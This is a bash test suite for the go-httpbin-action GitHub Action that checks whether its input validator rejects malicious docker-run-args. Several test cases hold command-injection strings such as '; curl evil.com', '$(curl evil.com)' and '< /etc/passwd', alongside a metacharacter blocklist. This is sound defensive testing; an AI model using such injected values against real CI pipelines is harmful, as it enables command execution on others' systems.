#!/usr/bin/env bash

# SPDX-License-Identifier: Apache-2.0
# SPDX-FileCopyrightText: 2025 The Linux Foundation

# Input Validation Test Suite for go-httpbin-action
# This script tests various security validations to ensure malicious inputs are properly blocked.

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Test configuration
ACTION_PATH="${ACTION_PATH:-./}"  # Path to the action (current directory by default)
CLEANUP_CONTAINERS=true
VERBOSE=false

# Usage function
usage() {
    cat << EOF
Usage: $0 [OPTIONS]

Options:
    -h, --help          Show this help message
    -v, --verbose       Enable verbose output
    --no-cleanup        Don't clean up test containers after tests
    --action-path PATH  Path to the action directory (default: ./)

Examples:
    $0                          # Run all tests with default settings
    $0 -v                       # Run with verbose output
    $0 --no-cleanup             # Keep containers after tests for debugging
    $0 --action-path ../action  # Use action from different directory

EOF
}

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            usage
            exit 0
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        --no-cleanup)
            CLEANUP_CONTAINERS=false
            shift
            ;;
        --action-path)
            ACTION_PATH="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            usage
            exit 1
            ;;
    esac
done

# Global test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Logging functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[PASS]${NC} $1"
}

log_error() {
    echo -e "${RED}[FAIL]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_verbose() {
    if [[ "$VERBOSE" == "true" ]]; then
        echo -e "${BLUE}[DEBUG]${NC} $1"
    fi
}

# Test framework functions
start_test() {
    local test_name="$1"
    TESTS_RUN=$((TESTS_RUN + 1))
    log_info "Running test: $test_name"
}

pass_test() {
    local test_name="$1"
    TESTS_PASSED=$((TESTS_PASSED + 1))
    log_success "$test_name"
}

fail_test() {
    local test_name="$1"
    local reason="$2"
    TESTS_FAILED=$((TESTS_FAILED + 1))
    log_error "$test_name - $reason"
}

# Cleanup function
cleanup_container() {
    local container_name="$1"
    if [[ "$CLEANUP_CONTAINERS" == "true" ]]; then
        log_verbose "Cleaning up container: $container_name"
        docker stop "$container_name" 2>/dev/null || true
        docker rm "$container_name" 2>/dev/null || true
    else
        log_verbose "Skipping cleanup for container: $container_name (--no-cleanup flag set)"
    fi
}

# Function to run the action and capture its outcome
run_action_test() {
    local test_name="$1"
    local container_name="$2"
    local port="$3"
    local docker_run_args="$4"
    local should_fail="$5"  # "true" if the action should fail, "false" if it should succeed

    start_test "$test_name"

    # Create a temporary workflow file for this test
    local temp_workflow
    temp_workflow=$(mktemp)
    local temp_dir
    temp_dir=$(mktemp -d)

    cat > "$temp_workflow" << EOF
name: Test Action
on: workflow_dispatch
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Test Action
        id: test-step
        uses: $ACTION_PATH
        with:
          container-name: '$container_name'
          port: '$port'
          docker-run-args: '$docker_run_args'
          skip-certificate: 'true'
          debug: 'true'
        continue-on-error: true
EOF

    # For local testing, we'll simulate the action by calling it directly
    # In a real environment, this would use GitHub Actions
    local exit_code=0


    # Simulate running the action locally by sourcing the main script logic
    # We'll create a minimal test harness
    if run_action_locally "$container_name" "$port" "$docker_run_args"; then
        exit_code=0
    else
        exit_code=1
    fi

    # Check if the result matches expectations
    if [[ "$should_fail" == "true" ]]; then
        if [[ $exit_code -ne 0 ]]; then
            pass_test "$test_name (correctly failed as expected)"
        else
            fail_test "$test_name" "Expected action to fail but it succeeded"
        fi
    else
        if [[ $exit_code -eq 0 ]]; then
            pass_test "$test_name (correctly succeeded as expected)"
        else
            fail_test "$test_name" "Expected action to succeed but it failed"
        fi
    fi

    # Cleanup
    cleanup_container "$container_name"
    rm -f "$temp_workflow"
    rm -rf "$temp_dir"
}

# Function to simulate running the action locally
# This extracts and runs just the validation logic from the action
run_action_locally() {
    local container_name="$1"
    local port="$2"
    local docker_run_args="$3"

    log_verbose "Testing docker-run-args: '$docker_run_args'"

    # Extract the validation logic from action.yaml and run it
    # This simulates what the action would do

    if [[ -n "$docker_run_args" ]]; then
        # Parse docker-run-args with proper shell argument parsing
        declare -a RAW_ARGS
        IFS=' ' read -ra RAW_ARGS <<< "$docker_run_args"

        # Validate each argument
        for arg in "${RAW_ARGS[@]}"; do
            # Skip empty arguments
            [[ -z "$arg" ]] && continue

            log_verbose "Validating argument: '$arg'"

            # Check for command injection patterns
            if [[ "$arg" == *";"* ]] || [[ "$arg" == *"&"* ]] || [[ "$arg" == *"|"* ]] || \
               [[ "$arg" == *"\$("* ]] || \
               [[ "$arg" == *'`'* ]]; then
                log_verbose "Command injection pattern detected in: $arg"
                return 1
            fi

            # Check for suspicious variable expansion patterns
            if [[ "$arg" == *"\${"* ]] || \
               [[ "$arg" =~ \$[A-Za-z_] ]]; then
                log_verbose "Variable expansion detected in: $arg"
                return 1
            fi

            # Check for shell redirection that could be dangerous
            if [[ "$arg" == *"<"* ]] || [[ "$arg" == *">"* ]]; then
                if [[ ! "$arg" =~ ^--[a-zA-Z-]+[\<\>=] ]]; then
                    log_verbose "Shell redirection detected in: $arg"
                    return 1
                fi
            fi

            # Validate Docker argument format for flags
            if [[ "$arg" =~ ^- ]] && [[ ! "$arg" =~ ^--?[a-zA-Z0-9-]+(=.*)?$ ]]; then
                log_verbose "Invalid Docker argument format: $arg"
                return 1
            fi
        done
    fi

    # If we get here, validation passed
    log_verbose "All validations passed"
    return 0
}

# Individual test functions
test_valid_arguments() {
    run_action_test \
        "Valid arguments should succeed" \
        "test-valid" \
        "8080" \
        "--memory=512m --cpu-shares=512" \
        "false"
}

test_command_injection_semicolon() {
    run_action_test \
        "Command injection with semicolon should fail" \
        "test-semicolon" \
        "8081" \
        "--memory=512m; curl evil.com" \
        "true"
}

test_command_injection_ampersand() {
    run_action_test \
        "Command injection with ampersand should fail" \
        "test-ampersand" \
        "8082" \
        "--memory=512m & curl evil.com" \
        "true"
}

test_command_injection_pipe() {
    run_action_test \
        "Command injection with pipe should fail" \
        "test-pipe" \
        "8083" \
        "--memory=512m | curl evil.com" \
        "true"
}

test_command_substitution() {
    run_action_test \
        "Command substitution should fail" \
        "test-cmd-sub" \
        "8084" \
        "--memory=\$(curl evil.com)" \
        "true"
}

test_backtick_substitution() {
    run_action_test \
        "Backtick command substitution should fail" \
        "test-backtick" \
        "8085" \
        "--memory=\`curl evil.com\`" \
        "true"
}

test_variable_expansion_braces() {
    run_action_test \
        "Variable expansion with braces should fail" \
        "test-var-exp" \
        "8086" \
        "--env=\${HOME}/malicious" \
        "true"
}

test_variable_expansion_simple() {
    run_action_test \
        "Variable expansion without braces should fail" \
        "test-var-ref" \
        "8087" \
        "--env=\$PATH" \
        "true"
}

test_shell_redirection_input() {
    run_action_test \
        "Shell input redirection should fail" \
        "test-redirect-in" \
        "8088" \
        "--memory < /etc/passwd" \
        "true"
}

test_shell_redirection_output() {
    run_action_test \
        "Shell output redirection should fail" \
        "test-redirect-out" \
        "8089" \
        "--memory > /tmp/evil" \
        "true"
}

test_invalid_flag_format() {
    run_action_test \
        "Invalid flag format should fail" \
        "test-invalid-flag" \
        "8090" \
        "--mem@ry=512m" \
        "true"
}

test_valid_flag_with_equals() {
    run_action_test \
        "Valid flag with equals should succeed" \
        "test-valid-equals" \
        "8091" \
        "--memory=512m" \
        "false"
}

test_valid_short_flag() {
    run_action_test \
        "Valid short flag should succeed" \
        "test-valid-short" \
        "8092" \
        "-m 512m" \
        "false"
}

test_docker_acceptable_redirection() {
    run_action_test \
        "Docker flag with acceptable redirection pattern should succeed" \
        "test-docker-redirect" \
        "8093" \
        "--log-driver=json-file" \
        "false"
}

test_multiple_valid_args() {
    run_action_test \
        "Multiple valid arguments should succeed" \
        "test-multiple" \
        "8094" \
        "--memory=512m --cpu-shares=512 --restart=unless-stopped" \
        "false"
}

test_empty_args() {
    run_action_test \
        "Empty docker-run-args should succeed" \
        "test-empty" \
        "8095" \
        "" \
        "false"
}

# Main test execution
main() {
    log_info "Starting input validation tests for go-httpbin-action"
    log_info "Action path: $ACTION_PATH"
    log_info "Cleanup containers: $CLEANUP_CONTAINERS"
    log_info "Verbose mode: $VERBOSE"
    echo

    # Check if action path exists
    if [[ ! -f "$ACTION_PATH/action.yaml" ]] && [[ ! -f "$ACTION_PATH/action.yml" ]]; then
        log_error "Action file not found at $ACTION_PATH/action.yaml or $ACTION_PATH/action.yml"
        exit 1
    fi

    # Run all tests
    test_valid_arguments
    test_command_injection_semicolon
    test_command_injection_ampersand
    test_command_injection_pipe
    test_command_substitution
    test_backtick_substitution
    test_variable_expansion_braces
    test_variable_expansion_simple
    test_shell_redirection_input
    test_shell_redirection_output
    test_invalid_flag_format
    test_valid_flag_with_equals
    test_valid_short_flag
    test_docker_acceptable_redirection
    test_multiple_valid_args
    test_empty_args

    # Print summary
    echo
    log_info "Test Summary:"
    echo "  Total tests run: $TESTS_RUN"
    echo "  Tests passed: $TESTS_PASSED"
    echo "  Tests failed: $TESTS_FAILED"

    if [[ $TESTS_FAILED -eq 0 ]]; then
        log_success "All tests passed! 🎉"
        exit 0
    else
        log_error "Some tests failed! ❌"
        exit 1
    fi
}

# Run main function if script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
